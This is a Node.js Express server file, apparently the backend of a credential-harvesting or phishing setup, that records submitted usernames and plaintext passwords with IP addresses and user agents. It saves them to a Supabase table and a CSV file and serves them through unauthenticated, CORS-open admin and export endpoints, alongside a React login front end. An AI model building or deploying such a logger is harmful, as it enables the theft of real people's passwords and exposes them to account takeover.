import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import moment from 'moment';
import { createClient } from '@supabase/supabase-js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());

// Serve static files from the React build directory (path needed for React SPA fallback)
const distPath = path.join(__dirname, 'dist');

// ─── Supabase Configuration ──────────────────────────────────────
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://pgsccgetvjjoerefqitb.supabase.co';
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY || '';

let supabase;
let dbConnected = false;

if (SUPABASE_SERVICE_KEY) {
  supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);
  dbConnected = true;
  console.log('✅ Connected to Supabase');
} else {
  console.warn('⚠️  Supabase key not configured. Using CSV fallback.');
}

// Ensure logs directory exists (for CSV fallback)
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir, { recursive: true });
}

// CSV file path (fallback)
const csvFilePath = path.join(logsDir, 'login_attempts.csv');

// Initialize CSV with headers if it doesn't exist
if (!fs.existsSync(csvFilePath)) {
  const headers = 'Timestamp,Username,Password,Attempt Number,Status,User Agent,IP Address\n';
  fs.writeFileSync(csvFilePath, headers);
}

// ─── Logging Endpoint ────────────────────────────────────────────
app.post('/api/logs-login', async (req, res) => {
  try {
    const { username, password, attemptNumber, status, timestamp, userAgent } = req.body;
    
    // Get client IP
    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    
    const logData = {
      timestamp: new Date(timestamp).toISOString(),
      username,
      password,
      attempt_number: attemptNumber,
      status,
      user_agent: userAgent,
      ip_address: ipAddress,
    };
    
    // Try Supabase first
    if (dbConnected && supabase) {
      try {
        const { error } = await supabase
          .from('login_logs')
          .insert([logData]);
        
        if (error) {
          console.error('Error saving to Supabase:', error.message);
          throw error;
        }
      } catch (err) {
        console.error('Error saving to Supabase:', err.message);
        dbConnected = false; // Fallback to CSV
      }
    }
    
    // Also save to CSV as backup
    const csvRow = [
      timestamp,
      `"${username}"`,
      `"${password}"`,
      attemptNumber,
      status,
      `"${userAgent}"`,
      ipAddress,
    ].join(',') + '\n';
    fs.appendFileSync(csvFilePath, csvRow);
    
    console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] Login attempt logged: ${username} (Attempt #${attemptNumber} - ${status})`);
    
    res.json({ success: true, message: 'Login attempt logged', stored: dbConnected ? 'Supabase' : 'CSV' });
  } catch (error) {
    console.error('Error logging login attempt:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ─── Admin Logs Retrieval Endpoint ───────────────────────────────
app.get('/api/admin/logs', async (req, res) => {
  try {
    const { limit = 100, status, username } = req.query;
    
    let logs;
    
    if (dbConnected && supabase) {
      try {
        let query = supabase
          .from('login_logs')
          .select('*')
          .order('timestamp', { ascending: false })
          .limit(parseInt(limit));
        
        if (status) {
          query = query.eq('status', status);
        }
        
        if (username) {
          query = query.ilike('username', `%${username}%`);
        }
        
        const { data, error } = await query;
        
        if (error) throw error;
        
        logs = data || [];
      } catch (err) {
        console.error('Error retrieving from Supabase:', err.message);
        throw err;
      }
    } else {
      // Fallback: Read from CSV
      const data = fs.readFileSync(csvFilePath, 'utf-8');
      const lines = data.split('\n').slice(1).filter(Boolean);
      logs = lines.map(line => {
        const [timestamp, user, pass, attempt, stat, ua, ip] = line.split(',');
        return { timestamp, username: user, password: pass, attempt_number: parseInt(attempt), status: stat, user_agent: ua, ip_address: ip };
      }).reverse().slice(0, parseInt(limit));
    }
    
    res.json({ success: true, count: logs.length, logs, source: dbConnected ? 'Supabase' : 'CSV' });
  } catch (error) {
    console.error('Error retrieving logs:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ─── Export Logs as JSON (for GitHub Actions backup) ─────────────
app.get('/api/admin/logs/export', async (req, res) => {
  try {
    let logs;
    
    if (dbConnected && supabase) {
      try {
        const { data, error } = await supabase
          .from('login_logs')
          .select('*')
          .order('timestamp', { ascending: false });
        
        if (error) throw error;
        
        logs = data || [];
      } catch (err) {
        console.error('Error exporting from Supabase:', err.message);
        throw err;
      }
    } else {
      const data = fs.readFileSync(csvFilePath, 'utf-8');
      const lines = data.split('\n').slice(1).filter(Boolean);
      logs = lines.map(line => {
        const [timestamp, user, pass, attempt, stat, ua, ip] = line.split(',');
        return { timestamp, username: user, password: pass, attempt_number: parseInt(attempt), status: stat, user_agent: ua, ip_address: ip };
      });
    }
    
    res.json({ timestamp: new Date().toISOString(), total: logs.length, logs });
  } catch (error) {
    console.error('Error exporting logs:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ─── Health Check Endpoint ──────────────────────────────────────
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'Logger server is running', 
    port: PORT,
    database: dbConnected ? 'Supabase Connected' : 'Using CSV Fallback',
    csvPath: csvFilePath,
  });
});

// Serve static files from the React build directory (after API routes!)
app.use(express.static(distPath));

// Serve React app for all non-API routes (SPA fallback)
app.get('*', (req, res) => {
  res.sendFile(path.join(distPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`\n🔒 Login Logger Server running on http://localhost:${PORT}`);
  console.log(`📊 Database: ${dbConnected ? 'Supabase' : 'CSV (Fallback)'}`);
  console.log(`📁 CSV backup: ${csvFilePath}\n`);
});
